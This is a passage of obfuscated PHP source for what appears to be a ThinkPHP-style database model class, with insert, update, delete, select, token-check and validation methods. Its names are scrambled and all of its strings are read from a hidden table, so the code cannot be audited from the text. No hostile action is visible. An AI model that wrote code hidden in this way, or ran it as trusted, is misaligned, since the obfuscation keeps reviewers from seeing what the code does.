think_config($ßµ¬ò£ä[316]); think_var_cache($ßµ¬ò£ä[317] . strtolower(get_path_this($°º±Î™½) . $ßµ¬ò£ä[10] . $this->name), $this->fields); } } public function switchModel($ÏÄªŠÜ, $¯ÎÚûÛı = array()) { $õÕÒ¼Ï =& $_SERVER[è¶³ÒßÑ]; $õ÷Šõª = ucwords(strtolower($ÏÄªŠÜ)) . $õÕÒ¼Ï[323]; if (!class_exists($õ÷Šõª)) { think_exception($õ÷Šõª . think_lang($õÕÒ¼Ï[324])); } $this->_extModel = new $õ÷Šõª($this->name); if (!empty($¯ÎÚûÛı)) { foreach ($¯ÎÚûÛı as $„·ÚûâÃ) { $this->_extModel->setProperty($„·ÚûâÃ, $this->{$„·ÚûâÃ}); } } return $this->_extModel; } public function __set($ŠñˆÔ‚è, $ÛÌ²½×›) { $this->data[$ŠñˆÔ‚è] = $ÛÌ²½×›; } public function __get($ÎºÑŞ„›) { return isset($this->data[$ÎºÑŞ„›]) ? $this->data[$ÎºÑŞ„›] : null; } public function __isset($´°éÍìÎ) { return isset($this->data[$´°éÍìÎ]); } public function __unset($ıÈÔ´ïµ) { unset($this->data[$ıÈÔ´ïµ]); } public function __call($åùô¹·ƒ, $•ñÓ§Ë) { $·âüµ­Ú =& $_SERVER[è¶³ÒßÑ]; if (in_array(strtolower($åùô¹·ƒ), $this->methods, !0)) { $this->options[strtolower($åùô¹·ƒ)] = $•ñÓ§Ë[0]; return $this; } elseif (in_array(strtolower($åùô¹·ƒ), array($·âüµ­Ú[325], $·âüµ­Ú[326], $·âüµ­Ú[327], $·âüµ­Ú[328], $·âüµ­Ú[329]), !0)) { $´Š³÷ğÂ = isset($•ñÓ§Ë[0]) ? $•ñÓ§Ë[0] : $·âüµ­Ú[230]; $´Š³÷ğÂ = $this->db->parseKey($´Š³÷ğÂ); return $this->getField(strtoupper($åùô¹·ƒ) . $·âüµ­Ú[330] . $´Š³÷ğÂ . $·âüµ­Ú[331] . $åùô¹·ƒ, $·âüµ­Ú[325]); } elseif (strtolower(substr($åùô¹·ƒ, 0, 5)) == $·âüµ­Ú[332]) { $´Š³÷ğÂ = think_parse_name(substr($åùô¹·ƒ, 5)); $ôåĞÃŒ[$´Š³÷ğÂ] = $•ñÓ§Ë[0]; return $this->where($ôåĞÃŒ)->find(); } elseif (strtolower(substr($åùô¹·ƒ, 0, 10)) == $·âüµ­Ú[333]) { $äı³–õ = think_parse_name(substr($åùô¹·ƒ, 10)); $ôåĞÃŒ[$äı³–õ] = $•ñÓ§Ë[0]; return $this->where($ôåĞÃŒ)->getField($•ñÓ§Ë[1]); } elseif (isset($this->_scope[$åùô¹·ƒ])) { return $this->scope($åùô¹·ƒ, $•ñÓ§Ë[0]); } elseif (method_exists($this, $åùô¹·ƒ)) { array_unshift($•ñÓ§Ë, $åùô¹·ƒ); return call_user_func_array(array($this, $·âüµ­Ú[334]), $•ñÓ§Ë); } else { return call_user_func_array(array(parent, $åùô¹·ƒ), $•ñÓ§Ë); } } protected function call() { $µŞÀÎĞ =& $_SERVER[è¶³ÒßÑ]; $ö’ÈÛ®‘ = func_get_args(); $ØïŒøÃ£ = array_shift($ö’ÈÛ®‘); $˜Á›ÕĞÃ = $ØïŒøÃ£; if (is_array($ØïŒøÃ£)) { $˜Á›ÕĞÃ = $ØïŒøÃ£[1]; $ØïŒøÃ£ = $ØïŒøÃ£[0]; } $éüíì = count($ö’ÈÛ®‘) - 1; if (isset($ö’ÈÛ®‘[$éüíì]) && $ö’ÈÛ®‘[$éüíì] === $ØïŒøÃ£) { think_exception(__CLASS__ . $µŞÀÎĞ[4] . $ØïŒøÃ£ . think_lang($µŞÀÎĞ[335])); return; } $ö’ÈÛ®‘[] = $ØïŒøÃ£; if (method_exists($this, $µŞÀÎĞ[336])) { $Åµ¼â®× = call_user_func_array(array($this, $µŞÀÎĞ[337]), array($˜Á›ÕĞÃ, $ö’ÈÛ®‘)); if (!is_null($Åµ¼â®×) && $Åµ¼â®× !== !1) { return $Åµ¼â®×; } } $ÀÔ¤Ü£¼ = call_user_func_array(array($this, $ØïŒøÃ£), $ö’ÈÛ®‘); if (method_exists($this, $µŞÀÎĞ[338])) { $Åµ¼â®× = call_user_func_array(array($this, $µŞÀÎĞ[339]), array($˜Á›ÕĞÃ, $ö’ÈÛ®‘, $ÀÔ¤Ü£¼)); if ($Åµ¼â®×) { return $Åµ¼â®×; } } return $ÀÔ¤Ü£¼; } protected function _initialize() { } protected function _facade($ÇÂºÄÃ©) { $ñœ¦ğ¨ü =& $_SERVER[è¶³ÒßÑ]; if (!empty($this->fields)) { foreach ($ÇÂºÄÃ© as $Ÿéãæû± => $Ê¦‡Š™) { if (is_array($this->fields) && !in_array($Ÿéãæû±, $this->fields, !0)) { unset($ÇÂºÄÃ©[$Ÿéãæû±]); } elseif (is_scalar($Ê¦‡Š™)) { $this->_parseType($ÇÂºÄÃ©, $Ÿéãæû±); } } } if (!empty($this->options[$ñœ¦ğ¨ü[340]])) { $ÇÂºÄÃ© = array_map($this->options[$ñœ¦ğ¨ü[340]], $ÇÂºÄÃ©); unset($this->options[$ñœ¦ğ¨ü[340]]); } $this->_beforeWrite($ÇÂºÄÃ©); return $ÇÂºÄÃ©; } protected function _beforeWrite(&$ñïÇœ) { } public function add($·õ’­´š = '', $¡°Ëã™Ä = array(), $‡À¿–¤ß = false) { if (empty($·õ’­´š)) { if (!empty($this->data)) { $·õ’­´š = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[è¶³ÒßÑ][341]); return !1; } } $¡°Ëã™Ä = $this->_parseOptions($¡°Ëã™Ä); $·õ’­´š = $this->_facade($·õ’­´š); if (!1 === $this->_beforeInsert($·õ’­´š, $¡°Ëã™Ä)) { return !1; } $Œ÷÷šİÍ = $this->db->insert($·õ’­´š, $¡°Ëã™Ä, $‡À¿–¤ß); if (!1 !== $Œ÷÷šİÍ) { $Â¿¡€àÀ = $this->getLastInsID(); if ($Â¿¡€àÀ) { $·õ’­´š[$this->getPk()] = $Â¿¡€àÀ; $this->_after_insert($·õ’­´š, $¡°Ëã™Ä); return $Â¿¡€àÀ; } $this->_after_insert($·õ’­´š, $¡°Ëã™Ä); } return $Œ÷÷šİÍ; } protected function _beforeInsert(&$éò˜Şƒİ, $„Ê×¢Î¬) { } protected function _after_insert($§Ş€¨, $ ÒÆ®€³) { } public function addAll($öğÔĞê, $ïøúÛ™ = array(), $Û´ƒåœ« = false) { $ÛĞ¥§© =& $_SERVER[è¶³ÒßÑ]; if (empty($öğÔĞê)) { $this->error = think_lang($ÛĞ¥§©[341]); return !1; } $ïøúÛ™ = $this->_parseOptions($ïøúÛ™); foreach ($öğÔĞê as $Ğ‹ÔÆÅÇ => $ğ„Ì¸†¡) { $öğÔĞê[$Ğ‹ÔÆÅÇ] = $this->_facade($ğ„Ì¸†¡); } if (method_exists($this->db, $ÛĞ¥§©[342])) { $˜“şéó’ = $this->db->insertAll($öğÔĞê, $ïøúÛ™, $Û´ƒåœ«); } else { $this->startTrans(); foreach ($öğÔĞê as $Ğ‹ÔÆÅÇ => $ğ„Ì¸†¡) { $˜“şéó’ = $this->db->insert($ğ„Ì¸†¡, $ïøúÛ™, $Û´ƒåœ«); } $this->commit(); } if (!1 !== $˜“şéó’) { $®­Â‹ĞŒ = $this->getLastInsID(); if ($®­Â‹ĞŒ) { return $®­Â‹ĞŒ; } } return $˜“şéó’; } public function selectAdd($µÊÓÃÉ¤ = '', $È†£…Õ = '', $¢µŞ­¬ = array()) { $Î“ÛÖ‚ß =& $_SERVER[è¶³ÒßÑ]; $¢µŞ­¬ = $this->_parseOptions($¢µŞ­¬); if (!1 === ($ƒÛÕğº = $this->db->selectInsert($µÊÓÃÉ¤ ? $µÊÓÃÉ¤ : $¢µŞ­¬[$Î“ÛÖ‚ß[343]], $È†£…Õ ? $È†£…Õ : $this->getTableName(), $¢µŞ­¬))) { $this->error = think_lang($Î“ÛÖ‚ß[344]); return !1; } else { return $ƒÛÕğº; } } public function save($şè¨ñëá = '', $òıùìé = array()) { $‰ûËÄ®¹ =& $_SERVER[è¶³ÒßÑ]; if (empty($şè¨ñëá)) { if (!empty($this->data)) { $şè¨ñëá = $this->data; $this->data = array(); } else { $this->error = think_lang($‰ûËÄ®¹[341]); return !1; } } $şè¨ñëá = $this->_facade($şè¨ñëá); $òıùìé = $this->_parseOptions($òıùìé); $ƒÕ£Œ«Š = $this->getPk(); if (!isset($òıùìé[$‰ûËÄ®¹[345]])) { if (isset($şè¨ñëá[$ƒÕ£Œ«Š])) { $à²ôöÍñ[$ƒÕ£Œ«Š] = $şè¨ñëá[$ƒÕ£Œ«Š]; $òıùìé[$‰ûËÄ®¹[345]] = $à²ôöÍñ; unset($şè¨ñëá[$ƒÕ£Œ«Š]); } else { $this->error = think_lang($‰ûËÄ®¹[344]); return !1; } } if (is_array($òıùìé[$‰ûËÄ®¹[345]]) && isset($òıùìé[$‰ûËÄ®¹[345]][$ƒÕ£Œ«Š])) { $ÕÏŠĞ±Ì = $òıùìé[$‰ûËÄ®¹[345]][$ƒÕ£Œ«Š]; } if (!1 === $this->_beforeUpdate($şè¨ñëá, $òıùìé)) { return !1; } $„¿Õ‰¦ = $this->db->update($şè¨ñëá, $òıùìé); if (!1 !== $„¿Õ‰¦) { if (isset($ÕÏŠĞ±Ì)) { $şè¨ñëá[$ƒÕ£Œ«Š] = $ÕÏŠĞ±Ì; } $this->_afterUpdate($şè¨ñëá, $òıùìé); } return $„¿Õ‰¦; } protected function _beforeUpdate(&$ãÕÖ Úï, $œÍæùŞÆ) { } protected function _afterUpdate($ş›ĞÈğ, $üÅÙß®§) { } public function delete($â·®Ìˆ× = array()) { $ìàõ¸Ú€ =& $_SERVER[è¶³ÒßÑ]; if (empty($â·®Ìˆ×) && empty($this->options[$ìàõ¸Ú€[345]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $÷ÔÒí› = $this->getPk(); if (is_numeric($â·®Ìˆ×) || is_string($â·®Ìˆ×)) { if (strpos($â·®Ìˆ×, $ìàõ¸Ú€[50])) { $Á¡Ô¾ıó[$÷ÔÒí›] = array($ìàõ¸Ú€[346], $â·®Ìˆ×); } else { $Á¡Ô¾ıó[$÷ÔÒí›] = $â·®Ìˆ×; } $this->options[$ìàõ¸Ú€[345]] = $Á¡Ô¾ıó; } $â·®Ìˆ× = $this->_parseOptions(); if (is_array($â·®Ìˆ×[$ìàõ¸Ú€[345]]) && isset($â·®Ìˆ×[$ìàõ¸Ú€[345]][$÷ÔÒí›])) { $‡©Ù­ˆÖ = $â·®Ìˆ×[$ìàõ¸Ú€[345]][$÷ÔÒí›]; } $ÚœÙ¬ÊË = $this->db->delete($â·®Ìˆ×); if (!1 !== $ÚœÙ¬ÊË) { $¼ÚÛâ½ù = array(); if (isset($‡©Ù­ˆÖ)) { $¼ÚÛâ½ù[$÷ÔÒí›] = $‡©Ù­ˆÖ; } $this->_after_delete($¼ÚÛâ½ù, $â·®Ìˆ×); } return $ÚœÙ¬ÊË; } protected function _after_delete($øşÚ™Š, $ñƒÁÇÔ†) { } public function select($©¯óî¹è = array()) { $¹è´Å­û =& $_SERVER[è¶³ÒßÑ]; if (is_string($©¯óî¹è) || is_numeric($©¯óî¹è)) { $³í©Ùëå = $this->getPk(); if (strpos($©¯óî¹è, $¹è´Å­û[50])) { $¬¸›ê’¡[$³í©Ùëå] = array($¹è´Å­û[346], $©¯óî¹è); } else { $¬¸›ê’¡[$³í©Ùëå] = $©¯óî¹è; } $this->options[$¹è´Å­û[345]] = $¬¸›ê’¡; } elseif (!1 === $©¯óî¹è) { $©¯óî¹è = $this->_parseOptions(); return $¹è´Å­û[347] . $this->db->buildSelectSql($©¯óî¹è) . $¹è´Å­û[348]; } $©¯óî¹è = $this->_parseOptions(); $Ï‰½· • = $this->db->select($©¯óî¹è); if (!1 === $Ï‰½· •) { return !1; } if (empty($Ï‰½· •)) { return null; } $this->_afterSelect($Ï‰½· •, $©¯óî¹è); return $Ï‰½· •; } protected function _afterSelect(&$‰…‘­ò¢, $€‘¿èÀ) { } public function buildSql($Âóïè¬‘ = array()) { $ñúÁÅÛ¬ =& $_SERVER[è¶³ÒßÑ]; $Âóïè¬‘ = $this->_parseOptions($Âóïè¬‘); return $ñúÁÅÛ¬[347] . $this->db->buildSelectSql($Âóïè¬‘) . $ñúÁÅÛ¬[348]; } public function optionsValue($š¢Í™Òş = null) { if (is_null($š¢Í™Òş)) { return $this->options; } elseif (is_array($š¢Í™Òş)) { $this->options = array_merge($this->options, $š¢Í™Òş); } } protected function _parseOptions($ØÊ©ë±ì = array()) { $ĞÜ ‘¢Ì =& $_SERVER[è¶³ÒßÑ]; if (is_array($ØÊ©ë±ì)) { $ØÊ©ë±ì = array_merge($this->options, $ØÊ©ë±ì); } $this->options = array(); if (!isset($ØÊ©ë±ì[$ĞÜ ‘¢Ì[349]])) { $ØÊ©ë±ì[$ĞÜ ‘¢Ì[349]] = $this->getTableName(); $«ÅÃö¶§ = $this->fields; } else { $«ÅÃö¶§ = $this->getDbFields(); } if (!empty($ØÊ©ë±ì[$ĞÜ ‘¢Ì[350]])) { $ØÊ©ë±ì[$ĞÜ ‘¢Ì[349]] .= $ĞÜ ‘¢Ì[53] . $ØÊ©ë±ì[$ĞÜ ‘¢Ì[350]]; } $ØÊ©ë±ì[$ĞÜ ‘¢Ì[351]] = $this->name; if (isset($ØÊ©ë±ì[$ĞÜ ‘¢Ì[345]]) && is_array($ØÊ©ë±ì[$ĞÜ ‘¢Ì[345]]) && !empty($«ÅÃö¶§) && !isset($ØÊ©ë±ì[$ĞÜ ‘¢Ì[352]]) && !isset($ØÊ©ë±ì[$ĞÜ ‘¢Ì[349]])) { foreach ($ØÊ©ë±ì[$ĞÜ ‘¢Ì[345]] as $¢«½‘èê => $™ó‡ıú) { $¢«½‘èê = trim($¢«½‘èê); if (in_array($¢«½‘èê, $«ÅÃö¶§, !0)) { if (is_scalar($™ó‡ıú)) { $this->_parseType($ØÊ©ë±ì[$ĞÜ ‘¢Ì[345]], $¢«½‘èê); } } elseif (!is_numeric($¢«½‘èê) && $ĞÜ ‘¢Ì[11] != substr($¢«½‘èê, 0, 1) && !1 === strpos($¢«½‘èê, $ĞÜ ‘¢Ì[10]) && !1 === strpos($¢«½‘èê, $ĞÜ ‘¢Ì[330]) && !1 === strpos($¢«½‘èê, $ĞÜ ‘¢Ì[224]) && !1 === strpos($¢«½‘èê, $ĞÜ ‘¢Ì[353])) { unset($ØÊ©ë±ì[$ĞÜ ‘¢Ì[345]][$¢«½‘èê]); } } } $this->_options_filter($ØÊ©ë±ì); return $ØÊ©ë±ì; } protected function _options_filter(&$¡Ñ±Ø¾ú) { } protected function _parseType(&$Ğ„×òØÎ, $û¤ù‡Ñ) { $¾¡…ÍáŞ =& $_SERVER[è¶³ÒßÑ]; if (empty($this->options[$¾¡…ÍáŞ[354]][$¾¡…ÍáŞ[4] . $û¤ù‡Ñ])) { $é÷ĞÉ‰¼ = strtolower($this->fields[$¾¡…ÍáŞ[322]][$û¤ù‡Ñ]); if (!1 !== strpos($é÷ĞÉ‰¼, $¾¡…ÍáŞ[355])) { } elseif (!1 === strpos($é÷ĞÉ‰¼, $¾¡…ÍáŞ[356]) && !1 !== strpos($é÷ĞÉ‰¼, $¾¡…ÍáŞ[357])) { $Ğ„×òØÎ[$û¤ù‡Ñ] = intval($Ğ„×òØÎ[$û¤ù‡Ñ]); } elseif (!1 !== strpos($é÷ĞÉ‰¼, $¾¡…ÍáŞ[358]) || !1 !== strpos($é÷ĞÉ‰¼, $¾¡…ÍáŞ[359])) { $Ğ„×òØÎ[$û¤ù‡Ñ] = floatval($Ğ„×òØÎ[$û¤ù‡Ñ]); } elseif (!1 !== strpos($é÷ĞÉ‰¼, $¾¡…ÍáŞ[360])) { $Ğ„×òØÎ[$û¤ù‡Ñ] = (bool) $Ğ„×òØÎ[$û¤ù‡Ñ]; } } } public function find($ëı‚Ä±Œ = array()) { $¿¬Â›à =& $_SERVER[è¶³ÒßÑ]; if (is_numeric($ëı‚Ä±Œ) || is_string($ëı‚Ä±Œ)) { $ŸŠû‹†Ğ[$this->getPk()] = intval($ëı‚Ä±Œ); $this->options[$¿¬Â›à[345]] = $ŸŠû‹†Ğ; } $this->options[$¿¬Â›à[361]] = 1; $ëı‚Ä±Œ = $this->_parseOptions(); $¬áÛ¢à° = $this->db->select($ëı‚Ä±Œ); if (!1 === $¬áÛ¢à°) { return !1; } if (empty($¬áÛ¢à°)) { return null; } $this->data = $¬áÛ¢à°[0]; $this->_afterFind($this->data, $ëı‚Ä±Œ); if (!empty($this->options[$¿¬Â›à[362]])) { return $this->returnResult($this->data, $this->options[$¿¬Â›à[362]]); } return $this->data; } protected function _afterFind(&$ÇûŞ»¹°, $–˜÷­÷û) { } protected function returnResult($¹øŞÌÛ‰, $Ã…Çéµ¼ = '') { $Œ´ºúÖİ =& $_SERVER[è¶³ÒßÑ]; if ($Ã…Çéµ¼) { if (is_callable($Ã…Çéµ¼)) { return call_user_func($Ã…Çéµ¼, $¹øŞÌÛ‰); } switch (strtolower($Ã…Çéµ¼)) { case $Œ´ºúÖİ[363]: return json_encode($¹øŞÌÛ‰); case $Œ´ºúÖİ[364]: return xml_encode($¹øŞÌÛ‰); } } return $¹øŞÌÛ‰; } public function parseFieldsMap($»Ä’ü¹, $ºŒÇØ½ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ú½ÀÀ¸² => $‰îšî) { if ($ºŒÇØ½ == 1) { if (isset($»Ä’ü¹[$‰îšî])) { $»Ä’ü¹[$ú½ÀÀ¸²] = $»Ä’ü¹[$‰îšî]; unset($»Ä’ü¹[$‰îšî]); } } else { if (isset($»Ä’ü¹[$ú½ÀÀ¸²])) { $»Ä’ü¹[$‰îšî] = $»Ä’ü¹[$ú½ÀÀ¸²]; unset($»Ä’ü¹[$ú½ÀÀ¸²]); } } } } return $»Ä’ü¹; } public function setField($´ÉÒœ×, $ä£ªó¨› = '') { if (is_array($´ÉÒœ×)) { $â´ªãíÁ = $´ÉÒœ×; } else { $â´ªãíÁ[$´ÉÒœ×] = $ä£ªó¨›; } return $this->save($â´ªãíÁ); } public function setAdd($„Âö»Æ, $¿²º¥©¢ = 1) { $À€€¥—ß =& $_SERVER[è¶³ÒßÑ]; $úÒÅÅó‹ = $„Âö»Æ . $À€€¥—ß[365] . $¿²º¥©¢; if ($¿²º¥©¢ < 0) { $úÒÅÅó‹ = $„Âö»Æ . $¿²º¥©¢; } return $this->setField($„Âö»Æ, array($À€€¥—ß[366], $úÒÅÅó‹)); } public function getField($û´èûá¯, $ûÏ¶ª‡Ş = null) { $ÏÅ˜É‘³ =& $_SERVER[è¶³ÒßÑ]; $§ÓÖºû[$ÏÅ˜É‘³[343]] = $û´èûá¯; $§ÓÖºû = $this->_parseOptions($§ÓÖºû); $û´èûá¯ = trim($û´èûá¯); if (strpos($û´èûá¯, $ÏÅ˜É‘³[50])) { if (!isset($§ÓÖºû[$ÏÅ˜É‘³[361]])) { $§ÓÖºû[$ÏÅ˜É‘³[361]] = is_numeric($ûÏ¶ª‡Ş) ? $ûÏ¶ª‡Ş : $ÏÅ˜É‘³[12]; } $ ûÁõŒÂ = $this->db->select($§ÓÖºû); if (!empty($ ûÁõŒÂ)) { $üª´šÍü = explode($ÏÅ˜É‘³[50], $û´èûá¯); $û´èûá¯ = array_keys($ ûÁõŒÂ[0]); $Î’—âëà = array_shift($û´èûá¯); $¨öÉÇŒÒ = array_shift($û´èûá¯); $ÖË€æ’ = array(); $§Ò›—€‡ = count($üª´šÍü); foreach ($ ûÁõŒÂ as $ï±ç‚¦®) { $”Ó÷¼úˆ = $ï±ç‚¦®[$Î’—âëà]; if (2 == $§Ò›—€‡) { $ÖË€æ’[$”Ó÷¼úˆ] = $ï±ç‚¦®[$¨öÉÇŒÒ]; } else { $ÖË€æ’[$”Ó÷¼úˆ] = is_string($ûÏ¶ª‡Ş) ? implode($ûÏ¶ª‡Ş, $ï±ç‚¦®) : $ï±ç‚¦®; } } return $ÖË€æ’; } } else { if (!0 !== $ûÏ¶ª‡Ş) { $§ÓÖºû[$ÏÅ˜É‘³[361]] = is_numeric($ûÏ¶ª‡Ş) ? $ûÏ¶ª‡Ş : 1; } if ($ûÏ¶ª‡Ş === $ÏÅ˜É‘³[325]) { unset($§ÓÖºû[$ÏÅ˜É‘³[361]]); } $ï±ç‚¦® = $this->db->select($§ÓÖºû); if (!empty($ï±ç‚¦®)) { if ($ûÏ¶ª‡Ş === $ÏÅ˜É‘³[325]) { return reset($ï±ç‚¦®[0]); } if (!0 !== $ûÏ¶ª‡Ş && 1 == $§ÓÖºû[$ÏÅ˜É‘³[361]]) { return reset($ï±ç‚¦®[0]); } foreach ($ï±ç‚¦® as $ïÄ­¥à›) { $ÃÊ‡º¿î[] = $ïÄ­¥à›[$û´èûá¯]; } return $ÃÊ‡º¿î; } } return null; } public function create($ù¤ÒÃš = '', $â²Ñ£Ò¼ = '') { $²ßÇ³åµ =& $_SERVER[è¶³ÒßÑ]; if (empty($ù¤ÒÃš)) { $ù¤ÒÃš = $_POST; } elseif (is_object($ù¤ÒÃš)) { $ù¤ÒÃš = get_object_vars($ù¤ÒÃš); } if (empty($ù¤ÒÃš) || !is_array($ù¤ÒÃš)) { $this->error = think_lang($²ßÇ³åµ[341]); return !1; } $ù¤ÒÃš = $this->parseFieldsMap($ù¤ÒÃš, 0); $â²Ñ£Ò¼ = $â²Ñ£Ò¼ ? $â²Ñ£Ò¼ : (!empty($ù¤ÒÃš[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$²ßÇ³åµ[343]])) { $Ğºªè«Ğ = $this->options[$²ßÇ³åµ[343]]; unset($this->options[$²ßÇ³åµ[343]]); } elseif ($â²Ñ£Ò¼ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ğºªè«Ğ = $this->insertFields; } elseif ($â²Ñ£Ò¼ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ğºªè«Ğ = $this->updateFields; } if (isset($Ğºªè«Ğ)) { if (is_string($Ğºªè«Ğ)) { $Ğºªè«Ğ = explode($²ßÇ³åµ[50], $Ğºªè«Ğ); } if (think_config($²ßÇ³åµ[367])) { $Ğºªè«Ğ[] = think_config($²ßÇ³åµ[368]); } foreach ($ù¤ÒÃš as $¯‹ëö => $öúÛŠÈ«) { if (!in_array($¯‹ëö, $Ğºªè«Ğ)) { unset($ù¤ÒÃš[$¯‹ëö]); } } } if (!$this->autoValidation($ù¤ÒÃš, $â²Ñ£Ò¼)) { return !1; } if (!$this->autoCheckToken($ù¤ÒÃš)) { $this->error = think_lang($²ßÇ³åµ[369]); return !1; } if ($this->autoCheckFields) { $Ğºªè«Ğ = $this->getDbFields(); foreach ($ù¤ÒÃš as $¯‹ëö => $öúÛŠÈ«) { if (!in_array($¯‹ëö, $Ğºªè«Ğ)) { unset($ù¤ÒÃš[$¯‹ëö]); } elseif (MAGIC_QUOTES_GPC && is_string($öúÛŠÈ«)) { $ù¤ÒÃš[$¯‹ëö] = stripslashes($öúÛŠÈ«); } } } $this->autoOperation($ù¤ÒÃš, $â²Ñ£Ò¼); $this->data = $ù¤ÒÃš; return $ù¤ÒÃš; } public function autoCheckToken($§åõäúî) { $ÆÖĞ™Êğ =& $_SERVER[è¶³ÒßÑ]; if (isset($this->options[$ÆÖĞ™Êğ[370]]) && !$this->options[$ÆÖĞ™Êğ[370]]) { return !0; } if (think_config($ÆÖĞ™Êğ[367])) { $º™Óˆ¡¯ = think_config($ÆÖĞ™Êğ[368]); if (!isset($§åõäúî[$º™Óˆ¡¯]) || Session::get($º™Óˆ¡¯)) { return !1; } list($Éß­×Õˆ, $”ç”‰ºÈ) = explode($ÆÖĞ™Êğ[11], $§åõäúî[$º™Óˆ¡¯]); if ($”ç”‰ºÈ && Session::get($º™Óˆ¡¯ . $ÆÖĞ™Êğ[10] . $Éß­×Õˆ) === $”ç”‰ºÈ) { Session::remove($º™Óˆ¡¯ . $ÆÖĞ™Êğ[10] . $Éß­×Õˆ); return !0; } if (think_config($ÆÖĞ™Êğ[371])) { Session::remove($º™Óˆ¡¯ . $ÆÖĞ™Êğ[10] . $Éß­×Õˆ); } return !1; } return !0; } public function regex($œîæ¶Å, $‘«ƒíÅ) { $Ö¡­İò =& $_SERVER[è¶³ÒßÑ]; $æ¬ØÊ§ = array($Ö¡­İò[372] => $Ö¡­İò[373], $Ö¡­İò[374] => $Ö¡­İò[375], $Ö¡­İò[376] => $Ö¡­İò[377], $Ö¡­İò[378] => $Ö¡­İò[379], $Ö¡­İò[380] => $Ö¡­İò[381], $Ö¡­İò[382] => $Ö¡­İò[383], $Ö¡­İò[384] => $Ö¡­İò[385], $Ö¡­İò[359] => $Ö¡­İò[386], $Ö¡­İò[387] => $Ö¡­İò[388]); if (isset($æ¬ØÊ§[strtolower($‘«ƒíÅ)])) { $‘«ƒíÅ = $æ¬ØÊ§[strtolower($‘«ƒíÅ)]; } return preg_match($‘«ƒíÅ, $œîæ¶Å) === 1; } private function autoOperation(&$÷è¨ÍëÈ, $Ã¦æîÖº) { $Â¤¬•”ï =& $_SERVER[è¶³ÒßÑ]; if (!empty($this->options[$Â¤¬•”ï[389]])) { $Ïñª¥Üò = $this->options[$Â¤¬•”ï[389]]; unset($this->options[$Â¤¬•”ï[389]]); } elseif (!empty($this->_auto)) { $Ïñª¥Üò = $this->_auto; } if (isset($Ïñª¥Üò)) { foreach ($Ïñª¥Üò as $¦Äõı±Â) { if (empty($¦Äõı±Â[2])) { $¦Äõı±Â[2] = THINK_MODEL_INSERT; } if ($Ã¦æîÖº == $¦Äõı±Â[2] || $¦Äõı±Â[2] == THINK_MODEL_BOTH) { switch (trim($¦Äõı±Â[3])) { case $Â¤¬•”ï[390]: case $Â¤¬•”ï[391]: $„õæ…‚È = isset($¦Äõı±Â[4]) ? (array) $¦Äõı±Â[4] : array(); if (isset($÷è¨ÍëÈ[$¦Äõı±Â[0]])) { array_unshift($„õæ…‚È, $÷è¨ÍëÈ[$¦Äõı±Â[0]]); } if ($Â¤¬•”ï[390] == $¦Äõı±Â[3]) { $÷è¨ÍëÈ[$¦Äõı±Â[0]] = call_user_func_array($¦Äõı±Â[1], $„õæ…‚È); } else { $÷è¨ÍëÈ[$¦Äõı±Â[0]] = call_user_func_array(array(&$this, $¦Äõı±Â[1]), $„õæ…‚È); } break; case $Â¤¬•”ï[343]: $÷è¨ÍëÈ[$¦Äõı±Â[0]] = $÷è¨ÍëÈ[$¦Äõı±Â[1]]; break; case $Â¤¬•”ï[392]: if ($Â¤¬•”ï[12] === $÷è¨ÍëÈ[$¦Äõı±Â[0]]) { unset($÷è¨ÍëÈ[$¦Äõı±Â[0]]); } break; case $Â¤¬•”ï[393]: default: $÷è¨ÍëÈ[$¦Äõı±Â[0]] = $¦Äõı±Â[1]; } if (!1 === $÷è¨ÍëÈ[$¦Äõı±Â[0]]) { unset($÷è¨ÍëÈ[$¦Äõı±Â[0]]); } } } } return $÷è¨ÍëÈ; } protected function autoValidation($–æœµ…ë, $†Â¹ú…’) { $‚âÈ…Ò =& $_SERVER[è¶³ÒßÑ]; if (!empty($this->options[$‚âÈ…Ò[394]])) { $‘šŠ‘ıô = $this->options[$‚âÈ…Ò[394]]; unset($this->options[$‚âÈ…Ò[394]]); } elseif (!empty($this->_validate)) { $‘šŠ‘ıô = $this->_validate; } if (isset($‘šŠ‘ıô)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‘šŠ‘ıô as $ì€×‡ğ => $ÔŸóğ—¥) { if (empty($ÔŸóğ—¥[5]) || $ÔŸóğ—¥[5] == THINK_MODEL_BOTH || $ÔŸóğ—¥[5] == $†Â¹ú…’) { if (0 == strpos($ÔŸóğ—¥[2], $‚âÈ…Ò[395]) && strpos($ÔŸóğ—¥[2], $‚âÈ…Ò[396])) { $ÔŸóğ—¥[2] = think_lang(substr($ÔŸóğ—¥[2], 2, -1)); } $ÔŸóğ—¥[3] = isset($ÔŸóğ—¥[3]) ? $ÔŸóğ—¥[3] : THINK_EXISTS_VALIDATE; $ÔŸóğ—¥[4] = isset($ÔŸóğ—¥[4]) ? $ÔŸóğ—¥[4] : $‚âÈ…Ò[397]; switch ($ÔŸóğ—¥[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($–æœµ…ë, $ÔŸóğ—¥)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‚âÈ…Ò[12] != trim($–æœµ…ë[$ÔŸóğ—¥[0]])) { if (!1 === $this->_validationField($–æœµ…ë, $ÔŸóğ—¥)) { return !1; } } break; default: if (isset($–æœµ…ë[$ÔŸóğ—¥[0]])) { if (!1 === $this->_validationField($–æœµ…ë, $ÔŸóğ—¥)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¶Úä¸÷, $èëö«×) { if (!1 === $this->_validationFieldItem($¶Úä¸÷, $èëö«×)) { if ($this->patchValidate) { $this->error[$èëö«×[0]] = $èëö«×[2]; } else { $this->error = $èëö«×[2]; return !1; } } return; } protected function _validationFieldItem($ÌÇŠˆ„ñ, $ş¼ô†å) { $Ì›´ÀÖ’ =& $_SERVER[è¶³ÒßÑ]; switch (strtolower(trim($ş¼ô†å[4]))) { case $Ì›´ÀÖ’[390]: case $Ì›´ÀÖ’[391]: $—ÄÇ½Û© = isset($ş¼ô†å[6]) ? (array) $ş¼ô†å[6] : array(); if (is_string($ş¼ô†å[0]) && strpos($ş¼ô†å[0], $Ì›´ÀÖ’[50])) { $ş¼ô†å[0] = explode($Ì›´ÀÖ’[50], 